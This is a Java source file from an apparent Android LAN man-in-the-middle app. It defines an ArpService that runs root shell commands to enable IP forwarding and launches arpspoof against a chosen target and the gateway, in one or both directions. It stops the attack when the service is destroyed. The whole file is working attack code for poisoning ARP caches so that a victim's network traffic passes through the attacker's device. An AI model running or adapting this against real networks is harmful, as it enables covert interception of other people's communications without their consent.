package com.oinux.lanmitm.service;

import java.net.NetworkInterface;
import java.net.SocketException;

import com.oinux.lanmitm.AppContext;
import com.oinux.lanmitm.util.ShellUtils;

import android.content.Intent;

public class ArpService extends BaseService {

	private String[] FORWARD_COMMANDS = {
			"echo 1 > /proc/sys/net/ipv4/ip_forward",
			"echo 1 > /proc/sys/net/ipv6/conf/all/forwarding" };

	private String[] UN_FORWARD_COMMANDS = {
			"echo 0 > /proc/sys/net/ipv4/ip_forward",
			"echo 0 > /proc/sys/net/ipv6/conf/all/forwarding" };

	public static final int TWO_WAY = 0x3;
	public static final int ONE_WAY_ROUTE = 0x1;
	public static final int ONE_WAY_HOST = 0x2;

	private Thread arpSpoof = null;
	private String arp_spoof_cmd = null;
	private String target_ip;
	private String arp_spoof_recv_cmd = null;
	private Thread arpSpoofRecv = null;
	private int arp_cheat_way = -1;

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		ShellUtils.execCommand("killall arpspoof", true, true);
		ShellUtils.execCommand(FORWARD_COMMANDS, true, true);

		String interfaceName = null;
		try {
			interfaceName = NetworkInterface.getByInetAddress(
					AppContext.getInetAddress()).getDisplayName();
		} catch (SocketException e) {
			e.printStackTrace();
		}
		if (arp_cheat_way == -1)
			arp_cheat_way = intent.getIntExtra("arp_cheat_way",
					AppContext.getInt("arp_cheat_way", ONE_WAY_HOST));

		if ((ONE_WAY_HOST & arp_cheat_way) != 0) {
			if (target_ip == null)
				target_ip = AppContext.getTarget().getIp();

			if (!target_ip.equals(AppContext.getGateway()))
				arp_spoof_cmd = getFilesDir() + "/arpspoof -i " + interfaceName
						+ " -t " + target_ip + " " + AppContext.getGateway();
			else
				arp_spoof_cmd = getFilesDir() + "/arpspoof -i " + interfaceName
						+ " -t " + AppContext.getGateway() + " " + target_ip;

			arpSpoof = new Thread() {

				@Override
				public void run() {
					ShellUtils.execCommand(arp_spoof_cmd, true, false);
				}
			};
			arpSpoof.start();
		}
		if ((ONE_WAY_ROUTE & arp_cheat_way) != 0) {
			arp_spoof_recv_cmd = getFilesDir() + "/arpspoof -i "
					+ interfaceName + " -t " + AppContext.getGateway() + " "
					+ AppContext.getIp();

			arpSpoofRecv = new Thread() {
				@Override
				public void run() {
					ShellUtils.execCommand(arp_spoof_recv_cmd, true, false);
				}
			};
			arpSpoofRecv.start();
		}

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		if (arpSpoof != null) {
			arpSpoof.interrupt();
			arpSpoof = null;
		}
		if (arpSpoofRecv != null) {
			arpSpoofRecv.interrupt();
			arpSpoofRecv = null;
		}
		new Thread() {
			public void run() {
				ShellUtils.execCommand("killall arpspoof", true, true);
				ShellUtils.execCommand(UN_FORWARD_COMMANDS, true, true);
			}
		}.start();
		super.onDestroy();
	}
}
